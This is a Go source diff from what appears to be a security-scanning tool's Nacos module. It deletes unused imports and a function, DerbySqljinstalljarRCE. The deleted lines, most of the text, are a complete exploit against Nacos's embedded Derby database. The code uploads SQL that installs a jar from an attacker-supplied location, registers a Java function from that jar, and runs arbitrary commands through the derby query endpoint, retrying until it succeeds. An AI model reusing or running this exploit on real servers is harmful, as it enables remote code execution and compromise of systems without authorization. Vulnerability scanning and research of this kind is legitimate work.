@@ -1,15 +1,9 @@
 package nacos
 
 import (
-	"bytes"
-	"context"
 	"fmt"
-	"mime/multipart"
 	"net/http"
-	"net/url"
 	"slack-wails/lib/clients"
-	"slack-wails/lib/gologger"
-	"slack-wails/lib/util"
 	"strings"
 )
 
@@ -71,56 +65,4 @@ func CVE_2021_29442(url string, client *http.Client) string {
 		}
 	}
 	return result
-}
-
-func DerbySqljinstalljarRCE(ctx context.Context, headers, target, command, service string, client *http.Client) string {
-	var times int
-	removalURL := target + "v1/cs/ops/data/removal"
-	derbyURL := target + "v1/cs/ops/derby"
-	var tempHeader []string
-	if headers != "" && strings.Contains(headers, ":") {
-		tempHeader = strings.Split(headers, ":")
-	}
-	for i := 0; i < 1<<31-1; i++ {
-		id := util.RandomStr(8)
-		postSQL := fmt.Sprintf(
-			`CALL sqlj.install_jar('%s', 'NACOS.%s', 0)
-   CALL SYSCS_UTIL.SYSCS_SET_DATABASE_PROPERTY('derby.database.classpath','NACOS.%s')
-   CREATE FUNCTION S_EXAMPLE_%s( PARAM VARCHAR(2000)) RETURNS VARCHAR(2000) PARAMETER STYLE JAVA NO SQL LANGUAGE JAVA EXTERNAL NAME 'test.poc.Example.exec'
-   `, service, id, id, id)
-		getSQL := fmt.Sprintf("select * from (select count(*) as b, S_EXAMPLE_%s('%s') as a from config_info) tmp /*ROWS FETCH NEXT*/", id, command)
-		body := &bytes.Buffer{}
-		writer := multipart.NewWriter(body)
-		part, err := writer.CreateFormFile("file", "postSql")
-		if err != nil {
-			gologger.Debug(ctx, "Failed to create form file: "+err.Error())
-		}
-		_, err = part.Write([]byte(postSQL))
-		if err != nil {
-			gologger.Debug(ctx, "Failed to write to form file: "+err.Error())
-		}
-		writer.Close()
-		header := map[string]string{
-			"Content-Type": writer.FormDataContentType(),
-		}
-		if len(tempHeader) >= 2 {
-			header[tempHeader[0]] = tempHeader[1]
-		}
-		_, respBody, err := clients.NewRequest("POST", removalURL, header, body, 10, true, client)
-		if err != nil {
-			gologger.Debug(ctx, err)
-		}
-		times++
-		if times > 1000 {
-			return "不存在该漏洞"
-		}
-		if strings.Contains(string(respBody), "\"code\":200") {
-			_, getBody, err := clients.NewSimpleGetRequest(derbyURL+"?sql="+url.QueryEscape(getSQL), client)
-			if err != nil {
-				gologger.Debug(ctx, "Failed to read response body: "+err.Error())
-			}
-			return string(getBody)
-		}
-	}
-	return "不存在该漏洞"
 }
